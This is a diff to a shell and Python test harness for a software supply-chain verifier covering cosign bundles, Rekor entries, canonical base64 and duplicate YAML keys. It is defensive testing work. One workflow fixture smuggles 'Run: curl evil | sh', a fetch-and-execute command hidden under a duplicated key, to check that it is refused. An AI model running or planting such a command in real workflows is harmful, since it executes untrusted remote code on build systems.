@@ -105,6 +105,11 @@
 #        JSON READERS are UTF-8 only: a record, a Rekor entries file, a digest file or a policy written in UTF-16/32 is refused, not guessed.
 #        TRUST STORE: the certificate chain is checked against the policy's root ONLY; the system trust store (SSL_CERT_FILE,
 #        SSL_CERT_DIR, the OpenSSL default directory) is never consulted ("root").
+#        ONE SPELLING (Codex security r1 S3): every base64 field is CANONICAL standard base64 (re-encoding the bytes gives the same text, so
+#        YR== for YQ== is refused) and every JSON reader refuses NaN, Infinity and -Infinity, which are not JSON.
+#        REKOR FILE SHAPE (S2): `entries` must be a list of objects; anything else is "refused at <stage>: rekor ... list", never a traceback.
+#   PyYAML (S4): only the `actions` subcommand needs it (imported there; missing, it is `error: ... PyYAML` exit 2); every other
+#       subcommand, `--help` included, runs on the bare standard library (the Sign job installs only cosign).
 #   DRY-RUN POLICY AND sign --check (round 7, Opus B-NEW b): `sign --check --policy <a made dry_run policy>` is accepted ONLY to
 #       verify Build's record (the hostile hand_sign_code attempt runs exactly that, with the dry policy from `policy make --ref`); the
 #       refusal causes it can give are digest and format, never "dry". It is not the sign-only rule of `verify` that refuses dry
@@ -136,7 +141,9 @@
 #       base64 of the PEM of the bundle's leaf, intermediates = the policy's chain, timestamps = [{"type":"rfc3161-response","data":<the bundle's
 #       signedTimestamp, a DER TimeStampResponse>}]}; and (b) DIR/provenance.rekor.json = {"entries":[the bundle's tlogEntries, untouched]}.
 #       (Witness records carry {"type":"tsp","data":<bare token>}: go-witness timestamp/tsp.go; the verifier reads each form by its type.) Both come from the
-#       bundle, so Sign's own output goes straight into `verify` (a case below does it). The Statement's predicate is a real SLSA v1
+#       bundle, so Sign's own output goes straight into `verify` (a case below does it). AFTER cosign (S1): a bundle with no or an empty
+#       timestamp list ("timestamp") or no or an empty tlogEntries list ("rekor") is refused naming each missing one, and Sign runs `verify
+#       --stage sign` over the two files it wrote before it prints ok; any refusal there removes DIR (no provenance is left behind). The Statement's predicate is a real SLSA v1
 #       one: buildDefinition present and runDetails.builder.id = the Sign workflow identity URI (.../stage-sign.yml@refs/tags/vX.Y.Z).
 #       The tests put a fake `cosign` first on PATH that implements just that call and signs with a local key; bin/install-scanner.sh
 #       must gain a checksum-pinned cosign for the Sign job. A failed check writes NOTHING to DIR. DIR never holds private key material.
@@ -161,7 +168,8 @@
 #       composite action.yml `runs.steps` (and, for a local `uses: ./path` named in "local", the action.yml found under --root,
 #       recursively); exit 1 naming the reference for anything not exactly listed by full digest,
 #       for an expression (${{ }}) in a reference, a short or upper-case sha, a tag or branch; a repository-local
-#       reusable call (`uses: ./path`) passes only if its path is in "local".
+#       reusable call (`uses: ./path`) passes only if its path is in "local". A mapping key repeated in one mapping (compared trimmed and
+#       case-folded: uses/"uses"/"uses ", run/Run) is refused naming the key, the file and the line (S5): a YAML reader keeps only one of them.
 #   chain-verify.py hostile-verdict|hostile-row|hostile-collect|hostile-material   (tested in bin/chain-hostile-test.sh)
 set -euo pipefail
 # the runner's own GITHUB_REF / GITHUB_EVENT_NAME (refs/pull/N/merge, pull_request ...) must never leak into a case: every case that
@@ -388,6 +396,11 @@ T, T2 = "refs/tags/v0.3.0", "refs/tags/v0.3.1"
 # the leaf the fake cosign signs with: SAN stage-sign.yml@T, Build Config URI release.yml@T, the GitHub issuer; valid like the others
 issue("interm", "fakeleaf", "subjectAltName = critical,URI:" + uri("stage-sign.yml", T) + "\n1.3.6.1.4.1.57264.1.8 = ASN1:UTF8String:" + ISSUER
       + "\n1.3.6.1.4.1.57264.1.18 = ASN1:UTF8String:" + uri("release.yml", T), now - dt.timedelta(minutes=30), now + dt.timedelta(minutes=180))
+# the leaf a dry run's Sign gets from Fulcio: the same files at the dry-run branch (Codex security r1 S1: Sign now verifies what it wrote,
+# so the fake cosign must sign a dry run with the branch identity, as Fulcio would)
+DRYREF = "refs/heads/hostile-proof/x"
+issue("interm", "fakeleafbr", "subjectAltName = critical,URI:" + uri("stage-sign.yml", DRYREF) + "\n1.3.6.1.4.1.57264.1.8 = ASN1:UTF8String:" + ISSUER
+      + "\n1.3.6.1.4.1.57264.1.18 = ASN1:UTF8String:" + uri("release.yml", DRYREF), now - dt.timedelta(minutes=30), now + dt.timedelta(minutes=180))
 PAY = {}
 def add(n, *a, **k): PAY[n] = record(n, *a, **k)
 # ---- Sign's provenance and its identity variants (001-AC4, 002-AC2)
@@ -400,7 +413,6 @@ add("xprefix_as_sign", "xstage-sign.yml", T, PROV, D)
 add("sign_rc", STAGES["sign"], "refs/tags/v0.3.0-rc1", PROV, D)
 add("sign_othertag", STAGES["sign"], T2, PROV, D)
 add("sign_branch", STAGES["sign"], "refs/heads/main", PROV, D)
-DRYREF = "refs/heads/hostile-proof/x"
 add("sign_br", STAGES["sign"], DRYREF, PROV, D, predicate={"dryRun": True})            # what a dry run's Sign writes (SAN ref = the branch, dryRun true)
 add("sign_flag_tag", STAGES["sign"], T, PROV, D, predicate={"dryRun": True})         # dryRun true even though the SAN ref IS the tag: Release must still refuse
 # branches NAMED like the tag (round 5 Opus B2a): a "last path segment" ref comparison accepts these
@@ -639,6 +651,34 @@ dj("rekor-bodycert.json", {"entries": [entry("sign_prov", 7, cert_from="sign_cfg
 _hb = {"apiVersion": "0.0.1", "kind": "hashedrekord", "spec": {"data": {"hash": {"algorithm": "sha256", "value": PAY["sign_prov"]}},
        "signature": {"content": json.load(open(p("sign_prov.json")))["signatures"][0]["sig"], "publicKey": {"content": json.load(open(p("sign_prov.json")))["signatures"][0]["certificate"]}}}}
 dj("rekor-hashedrekord.json", {"entries": [tlog_entry(_hb, 7, kind="hashedrekord")]})
+# ---- Codex security round 1 (S2): a Rekor entries file whose `entries` is not a list of entry objects ----
+for _k, _v in (("int", 1), ("str", "x"), ("null", None), ("dict", {"a": 1}), ("nondict", [1, "x", None])): dj("rekor-shape-%s.json" % _k, {"entries": _v})
+# ---- Codex security round 1 (S3): base64 must be CANONICAL (padding bits zero) and JSON must hold no NaN/Infinity ----
+A64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
+def noncanon(s):
+    """The same bytes spelled another way: set an unused padding bit of the last data character (YQ== -> YR==)."""
+    body = s.rstrip("="); pad = len(s) - len(body); assert pad, "no padding: no second spelling exists"
+    out = body[:-1] + A64[A64.index(body[-1]) | 1] + "=" * pad
+    assert out != s and base64.b64decode(out) == base64.b64decode(s), s
+    return out
+# a Sign record whose payload, signature, certificate and stamp all end in padding (so each has a non-canonical spelling)
+for _try in range(60):
+    add("sign_pad", STAGES["sign"], T, PROV, D, predicate={"pad": "x" * (_try % 3)})
+    _r = json.load(open(p("sign_pad.json"))); _e = _r["signatures"][0]
+    if all(x.endswith("=") for x in (_r["payload"], _e["sig"], _e["certificate"], _e["timestamps"][0]["data"])): break
+else: raise SystemExit("no sign_pad fixture with padding in every field after 60 tries: regenerate")
+dj("rekor-pad.json", {"entries": [entry("sign_pad", 21)]})
+mutate_field("sign_pad", "sign_nc_payload", lambda r: r.__setitem__("payload", noncanon(r["payload"])))
+mutate_field("sign_pad", "sign_nc_sig", lambda r: r["signatures"][0].__setitem__("sig", noncanon(r["signatures"][0]["sig"])))
+mutate_field("sign_pad", "sign_nc_cert", lambda r: r["signatures"][0].__setitem__("certificate", noncanon(r["signatures"][0]["certificate"])))
+mutate_field("sign_pad", "sign_nc_stamp", lambda r: r["signatures"][0]["timestamps"][0].__setitem__("data", noncanon(r["signatures"][0]["timestamps"][0]["data"])))
+e = entry("sign_prov", 7); e["logId"]["keyId"] = noncanon(e["logId"]["keyId"]); dj("rekor-nc-keyid.json", {"entries": [e]})   # a 32-byte key id always pads
+_vb = dsse_body("sign_pad"); _vb["spec"]["signatures"][0]["verifier"] = noncanon(_vb["spec"]["signatures"][0]["verifier"])
+dj("rekor-nc-verifier.json", {"entries": [tlog_entry(_vb, 21)]})                  # the log signs the body as it is
+add("sign_nan", STAGES["sign"], T, PROV, D, predicate={"x": float("nan")})       # json.dumps writes NaN: a signed payload that is not JSON
+dj("rekor-nan.json", {"entries": [entry("sign_nan", 22)]})
+open(p("sign_envinf.json"), "w").write(open(p("sign_prov.json")).read().replace('"payloadType"', '"x": Infinity, "payloadType"', 1))
+open(p("rekor-neginf.json"), "w").write(open(p("rekor.json")).read().replace('"entries"', '"n": -Infinity, "entries"', 1))
 # the verify times: NOW is 16+ minutes after every default leaf expired (leaf validity [now-5m, now+10m])
 open(p("now.txt"), "w").write(fmt(now + dt.timedelta(minutes=26)))
 open(p("now-in.txt"), "w").write(fmt(now + dt.timedelta(minutes=2)))
@@ -711,11 +751,13 @@ assert conf["rekorTlogUrls"][0]["majorApiVersion"] == 1, "the signing config mus
 body = open(st, "rb").read(); pt = "application/vnd.in-toto+json"
 pae = b"DSSEv1 %d %s %d %s" % (len(pt), pt.encode(), len(body), body)
 open(w + "/fake.pae", "wb").write(pae)
-sig = sh("dgst", "-sha256", "-sign", w + "/fakeleaf.key", w + "/fake.pae")
+# Fulcio issues the certificate for the run's own ref: a dry run (builder at the branch) gets the branch leaf
+leaf = "fakeleafbr" if json.loads(body)["predicate"]["runDetails"]["builder"]["id"].endswith("@refs/heads/hostile-proof/x") else "fakeleaf"
+sig = sh("dgst", "-sha256", "-sign", w + "/" + leaf + ".key", w + "/fake.pae")
 q = sh("ts", "-query", "-digest", hashlib.sha256(sig).hexdigest(), "-sha256", "-cert", "-no_nonce"); open(w + "/fake.tsq", "wb").write(q)
 sh("ts", "-reply", "-queryfile", w + "/fake.tsq", "-signer", w + "/tsa.pem", "-inkey", w + "/tsa.key", "-chain", w + "/tsaroot.pem",
    "-config", w + "/tsa.cnf", "-section", "t", "-out", w + "/fake.tsr")
-leaf_pem = open(w + "/fakeleaf.pem").read(); leaf_b64 = b64(leaf_pem.encode())
+leaf_pem = open(w + "/" + leaf + ".pem").read(); leaf_b64 = b64(leaf_pem.encode())
 rb = json.dumps({"apiVersion": "0.0.1", "kind": "dsse", "spec": {"envelopeHash": {"algorithm": "sha256", "value": "0" * 64},
       "payloadHash": {"algorithm": "sha256", "value": hashlib.sha256(body).hexdigest()}, "signatures": [{"signature": b64(sig), "verifier": leaf_b64}]}},
       sort_keys=True, separators=(",", ":")).encode()
@@ -725,10 +767,18 @@ canon = b64(rb)
 open(w + "/fake.set", "wb").write(json.dumps({"body": canon, "integratedTime": itime, "logID": logid, "logIndex": 4242}, sort_keys=True, separators=(",", ":")).encode())
 tl = {"logIndex": "4242", "logId": {"keyId": b64(bytes.fromhex(logid))}, "kindVersion": {"kind": "dsse", "version": "0.0.1"}, "integratedTime": str(itime),
       "inclusionPromise": {"signedEntryTimestamp": b64(sh("dgst", "-sha256", "-sign", w + "/rekor.key", w + "/fake.set"))}, "canonicalizedBody": canon}
-der = sh("x509", "-in", w + "/fakeleaf.pem", "-outform", "DER")
-json.dump({"mediaType": "application/vnd.dev.sigstore.bundle.v0.3+json",
-           "verificationMaterial": {"certificate": {"rawBytes": b64(der)}, "tlogEntries": [tl],
-                                     "timestampVerificationData": {"rfc3161Timestamps": [{"signedTimestamp": b64(open(w + "/fake.tsr", "rb").read())}]}},
+der = sh("x509", "-in", w + "/" + leaf + ".pem", "-outform", "DER")
+vm = {"certificate": {"rawBytes": b64(der)}, "tlogEntries": [tl],
+      "timestampVerificationData": {"rfc3161Timestamps": [{"signedTimestamp": b64(open(w + "/fake.tsr", "rb").read())}]}}
+# FAKE_BUNDLE (Codex security r1 S1): a bundle cosign returns with exit 0 but with material missing or wrong; Sign must refuse it
+mode = os.environ.get("FAKE_BUNDLE", "")
+if mode in ("nots", "nothing"): del vm["timestampVerificationData"]
+if mode in ("notlog", "nothing"): del vm["tlogEntries"]
+if mode == "emptyts": vm["timestampVerificationData"]["rfc3161Timestamps"] = []
+if mode == "emptytlog": vm["tlogEntries"] = []
+if mode == "nocert": del vm["certificate"]
+if mode == "badtlog": tl["logIndex"] = "99"          # the log's signed entry timestamp no longer verifies: only a verify of the output sees it
+json.dump({"mediaType": "application/vnd.dev.sigstore.bundle.v0.3+json", "verificationMaterial": vm,
            "dsseEnvelope": {"payloadType": pt, "payload": b64(body), "signatures": [{"sig": b64(sig), "keyid": ""}]}}, open(out, "w"))
 PYF
 FAKE
@@ -744,6 +794,7 @@ run() { : > "$work/cosign-argv.log"; local rc=0
   "${netcut[@]+"${netcut[@]}"}" env PATH="$work/fakebin:$PATH" OPENSSL="$OPENSSL" GITHUB_REF="${GITHUB_REF:-}" GITHUB_EVENT_NAME="${GITHUB_EVENT_NAME:-}" \
     ${SSL_CERT_FILE:+SSL_CERT_FILE=$SSL_CERT_FILE} ${SSL_CERT_DIR:+SSL_CERT_DIR=$SSL_CERT_DIR} \
     ${GITHUB_SHA:+GITHUB_SHA=$GITHUB_SHA} ${GITHUB_RUN_ID:+GITHUB_RUN_ID=$GITHUB_RUN_ID} ${GITHUB_SERVER_URL:+GITHUB_SERVER_URL=$GITHUB_SERVER_URL} \
+    ${FAKE_BUNDLE:+FAKE_BUNDLE=$FAKE_BUNDLE} ${PYTHONPATH:+PYTHONPATH=$PYTHONPATH} \
     ACTIONS_ID_TOKEN_REQUEST_TOKEN="$SENT_TOK" ACTIONS_ID_TOKEN_REQUEST_URL="https://token.invalid/$SENT_URL" COSIGN_IDENTITY_TOKEN="$SENT_CIT" \
     "$PY3" "$cv" "$@" 2> "$work/err" > "$work/out" || rc=$?
   if grep -F -q -e "$SENT_TOK" -e "$SENT_URL" -e "$SENT_CIT" "$work/err" "$work/out" "$work/cosign-argv.log" 2> /dev/null; then LEAKS=$((LEAKS + 1)); fi
@@ -1365,9 +1416,71 @@ expect_refuse "S-2 a newline inside the Rekor entry's canonical body, signed by 
 expect_refuse "S-2 a '*' inside the signed entry timestamp is refused" "rekor" verify $(V) --stage sign $(rec sign_prov) $(R rekor-setjunk.json)
 expect_ok     "S-2 control: the genuine record with the genuine Rekor entry is still accepted (standard, unpadded-newline-free base64)" verify $(V) --stage sign $(rec sign_prov) $(R)
 
-# every call the fake cosign ever received is the pinned form, and there were exactly as many as successful signs (never one for a refusal)
+# ---- Codex security round 1 --------------------------------------------------------------------------------------------------------
+# S1 (001-AC2, 002-AC1, 002-AC3): cosign exits 0 but its bundle lacks a timestamp or a Rekor entry, or carries a wrong one. Sign must refuse
+# AFTER cosign ran, name what is missing, and leave no provenance behind; it verifies its own output before it says ok.
+POSTSIGN=0
+expect_postsign_refuse() { local l=$1 words=$2 mode=$3 rc=0 l1 x miss=0; FAKE_BUNDLE=$mode run sign --check --signer cosign --build-record "$work/build_coll.json" \
+    --policy "$work/policy.json" --now "$NOW" --digests "$work/digests.json" --out "$work/sd/post-$mode" || rc=$?
+  [ -s "$work/cosign-argv.log" ] && POSTSIGN=$((POSTSIGN + 1))
+  l1=$(head -n 1 "$work/err" | tr 'A-Z' 'a-z')
+  printf '%s' "$l1" | grep -q '^refused at sign: ' || miss=1
+  IFS='|' read -r -a ws <<< "$words"
+  for x in "${ws[@]}"; do case $x in '!'*) ! printf '%s' "${l1#*: }" | grep -F -q -- "${x#!}" || miss=1 ;; *) printf '%s' "${l1#*: }" | grep -F -q -- "$x" || miss=1 ;; esac; done
+  if [ "$rc" = 1 ] && [ "$miss" = 0 ] && ! crashed && [ ! -e "$work/sd/post-$mode/provenance.json" ]; then ok "$l"
+  else bad "$l (exit $rc, wanted 1 with 'refused at sign:' and '$words', no provenance.json left; $(head -c 200 "$work/err" | tr '\n' ' '))"; fi; }
+expect_postsign_refuse "S1 a bundle with no timestampVerificationData is refused after cosign: the timestamp is named" "timestamp|!rekor" nots
+expect_postsign_refuse "S1 a bundle with an EMPTY rfc3161Timestamps list is refused: the timestamp is named" "timestamp|!rekor" emptyts
+expect_postsign_refuse "S1 a bundle with no tlogEntries is refused after cosign: the Rekor entry is named" "rekor|!timestamp" notlog
+expect_postsign_refuse "S1 a bundle with an EMPTY tlogEntries list is refused: the Rekor entry is named" "rekor|!timestamp" emptytlog
+expect_postsign_refuse "S1 a bundle lacking BOTH materials is refused and names both" "timestamp|rekor" nothing
+expect_postsign_refuse "S1 a bundle with no certificate is refused, not a traceback" "certificate" nocert
+expect_postsign_refuse "S1 a bundle whose Rekor entry no longer verifies is refused: Sign verifies what it wrote before it says ok" "rekor" badtlog
+[ "$POSTSIGN" = 7 ] && ok "S1 control: cosign WAS called in each of the seven cases above (the refusal is about the bundle, not an earlier check)" || bad "S1 cosign was called in only $POSTSIGN of the seven bundle cases"
+expect_ok     "S1 control: the same sign with an untouched bundle succeeds" sign --check --signer cosign --build-record "$work/build_coll.json" --policy "$work/policy.json" --now "$NOW" --digests "$work/digests.json" --out "$work/sd/post-control"
+# S2 (002-AC3, property e): a Rekor entries file whose `entries` is not a list of objects is a refusal naming the shape, never a traceback
+for k in int str null dict nondict; do
+  expect_refuse "S2 a Rekor entries file whose entries is $k is refused (no traceback), naming the list" "rekor|list" verify $(V) --stage sign $(rec sign_prov) $(R rekor-shape-$k.json)
+done
+# S3 (002-AC1, 002-AC3, NB-1): one byte string, one spelling. A non-canonical base64 (unused padding bits set, YR== for YQ==) is refused in every field
+expect_ok     "S3 control: the padded record with its Rekor entry is accepted (each field below differs from it only in its spelling)" verify $(V) --stage sign $(rec sign_pad) $(R rekor-pad.json)
+expect_refuse "S3 a non-canonical payload base64 is refused" "envelope" verify $(V) --stage sign $(rec sign_nc_payload) $(R rekor-pad.json)
+expect_refuse "S3 a non-canonical signature base64 is refused" "malformed" verify $(V) --stage sign $(rec sign_nc_sig) $(R rekor-pad.json)
+expect_refuse "S3 a non-canonical certificate base64 is refused" "malformed" verify $(V) --stage sign $(rec sign_nc_cert) $(R rekor-pad.json)
+expect_refuse "S3 a non-canonical timestamp base64 is refused" "timestamp" verify $(V) --stage sign $(rec sign_nc_stamp) $(R rekor-pad.json)
+expect_refuse "S3 a non-canonical Rekor log id (logId.keyId) is refused" "rekor" verify $(V) --stage sign $(rec sign_prov) $(R rekor-nc-keyid.json)
+expect_refuse "S3 a non-canonical verifier in the Rekor entry's body (signed by the log as it is) is refused" "rekor" verify $(V) --stage sign $(rec sign_pad) $(R rekor-nc-verifier.json)
+# S3: NaN, Infinity and -Infinity are not JSON; every strict reader refuses them (payload, envelope, Rekor file, policy)
+expect_refuse "S3 a signed payload holding NaN is refused (not JSON)" "predicate|!signature" verify $(V) --stage sign $(rec sign_nan) $(R rekor-nan.json)
+expect_refuse "S3 an envelope holding Infinity is refused" "envelope" verify $(V) --stage sign $(rec sign_envinf) $(R)
+expect_refuse "S3 a Rekor entries file holding -Infinity is refused" "rekor" verify $(V) --stage sign $(rec sign_prov) $(R rekor-neginf.json)
+sed 's/^{/{"nan": NaN, /' "$work/policy.json" > "$work/policy-nan.json"
+expect_refuse "S3 a policy holding NaN is refused" "policy" verify --policy "$work/policy-nan.json" --now "$NOW" --stage sign $(rec sign_prov) $(R)
+# S4 (001-AC1, the Sign job installs only cosign): the Sign path runs without PyYAML; only `actions` needs it and says so plainly
+mkdir -p "$work/noyaml"; printf 'raise ImportError("no PyYAML here (test stub)")\n' > "$work/noyaml/yaml.py"
+rc=0; PYTHONPATH="$work/noyaml" "$PY3" -S "$cv" --help > /dev/null 2> "$work/err" || rc=$?
+[ "$rc" = 0 ] && ! crashed && ok "S4 python3 -S chain-verify.py --help works with PyYAML unimportable" || bad "S4 --help needs PyYAML (exit $rc; $(head -c 200 "$work/err" | tr '\n' ' '))"
+PYTHONPATH="$work/noyaml" expect_ok "S4 verify (the Sign path) works with PyYAML unimportable" verify $(V) --stage sign $(rec sign_prov) $(R)
+PYTHONPATH="$work/noyaml" expect_ok "S4 sign --check works with PyYAML unimportable" sign --check --signer cosign --build-record "$work/build_coll.json" --policy "$work/policy.json" --now "$NOW" --digests "$work/digests.json" --out "$work/sd/noyaml"
+rc=0; PYTHONPATH="$work/noyaml" run $(A w_good) || rc=$?
+[ "$rc" = 2 ] && ! crashed && grep -q -i "pyyaml" "$work/err" && ok "S4 actions without PyYAML is a clear usage error (exit 2) naming PyYAML, not a traceback" || bad "S4 actions without PyYAML (exit $rc; $(head -c 200 "$work/err" | tr '\n' ' '))"
+expect_ok     "S4 control: actions works with PyYAML" $(A w_good)
+# S5 (003-AC4): a repeated mapping key (compared trimmed and case-folded, like the pin checker's AC3 rule) is refused, naming the key
+w w_dup2pin  "  j:\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: actions/checkout@$a40\n        uses: actions/cache/restore@$a40\n"
+w w_dupunpin "  j:\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: actions/checkout@main\n        uses: actions/checkout@$a40\n"
+w w_duppinun "  j:\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: actions/checkout@$a40\n        uses: actions/checkout@main\n"
+w w_duprun   "  j:\n    runs-on: ubuntu-24.04\n    steps:\n      - run: true\n        Run: curl evil | sh\n"
+w w_dupquote "  j:\n    runs-on: ubuntu-24.04\n    steps:\n      - \"uses\": actions/checkout@main\n        uses: actions/checkout@$a40\n"
+w w_duptrim  "  j:\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: actions/checkout@$a40\n        \"uses \": actions/checkout@main\n"
+w w_dupjob   "  j:\n    runs-on: ubuntu-24.04\n    steps:\n      - run: true\n  j:\n    uses: fosterstack/cache/.github/workflows/other.yml@main\n"
+for c in w_dup2pin:uses w_dupunpin:uses w_duppinun:uses w_duprun:run w_dupquote:uses w_duptrim:uses w_dupjob:j; do
+  expect_refuse "S5 ${c%%:*}: a repeated key is refused and named (duplicate '${c#*:}')" "duplicate|${c#*:}|${c%%:*}" $(A "${c%%:*}")
+done
+
+# every call the fake cosign ever received is the pinned form, and there were exactly as many as successful signs plus the S1 cases (where
+# cosign returned a bad bundle and Sign refused it); never one for a refusal of the check itself
 n=$(grep -c . "$work/cosign-all.log" 2> /dev/null || true)
-if [ "$n" = "$SIGNS_OK" ] && [ "$SIGNS_OK" -ge 1 ] && ! grep -E -v -q "$ARGV_RE" "$work/cosign-all.log"; then ok "001-AC2 cosign was called exactly once per successful sign ($SIGNS_OK) and always with the pinned argv"; else bad "001-AC2 cosign calls ($n) != successful signs ($SIGNS_OK), or an unpinned argv was used"; fi
+if [ "$n" = "$((SIGNS_OK + POSTSIGN))" ] && [ "$SIGNS_OK" -ge 1 ] && ! grep -E -v -q "$ARGV_RE" "$work/cosign-all.log"; then ok "001-AC2 cosign was called exactly once per successful sign ($SIGNS_OK) and per bad-bundle case ($POSTSIGN), always with the pinned argv"; else bad "001-AC2 cosign calls ($n) != successful signs ($SIGNS_OK) + bad-bundle cases ($POSTSIGN), or an unpinned argv was used"; fi
 [ "$LEAKS" = 0 ] && ok "001-AC3 the token sentinels (ACTIONS_ID_TOKEN_REQUEST_TOKEN/URL, COSIGN_IDENTITY_TOKEN) appear in no stdout, stderr or cosign argv of any run" || bad "001-AC3 a token sentinel leaked into $LEAKS run(s)' output or the cosign argv"
 if ! grep -r -F -q -e "$SENT_TOK" -e "$SENT_URL" -e "$SENT_CIT" "$work/sd" 2> /dev/null; then ok "001-AC3 the token sentinels appear in no file Sign wrote to any output folder"; else bad "001-AC3 a token sentinel was written into an output folder"; fi
 # the sentinels also appear in no file written ANYWHERE the verifier could write: the whole work dir (policies, stubs, outputs), the
@@ -1376,7 +1489,7 @@ leakfiles=$( { grep -r -l -F -e "$SENT_TOK" -e "$SENT_URL" -e "$SENT_CIT" "$work
                find "$PWD" -maxdepth 3 -type f -newer "$MARK" -not -path '*/.git/*' -not -path "$work/*" -print0 2> /dev/null | xargs -0 grep -l -F -e "$SENT_TOK" -e "$SENT_URL" -e "$SENT_CIT" 2> /dev/null || true
                find "${TMPDIR:-/tmp}" -maxdepth 3 -type f -newer "$MARK" -not -path "$work/*" -print0 2> /dev/null | xargs -0 grep -l -F -e "$SENT_TOK" -e "$SENT_URL" -e "$SENT_CIT" 2> /dev/null || true; } | sort -u)
 if [ -z "$leakfiles" ]; then ok "001-AC3 the token sentinels appear in no file written under the work dir, the current directory or the temp dir"; else bad "001-AC3 a token sentinel was written to: $(echo "$leakfiles" | head -3 | tr '\n' ' ')"; fi
-EXPECT=401
+EXPECT=438
 echo "pass=$pass fail=$failn"
 if [ $((pass + failn)) != "$EXPECT" ]; then echo "FAIL case count $((pass + failn)) != expected $EXPECT (a case was skipped or added)"; exit 1; fi
 [ "$failn" = 0 ]
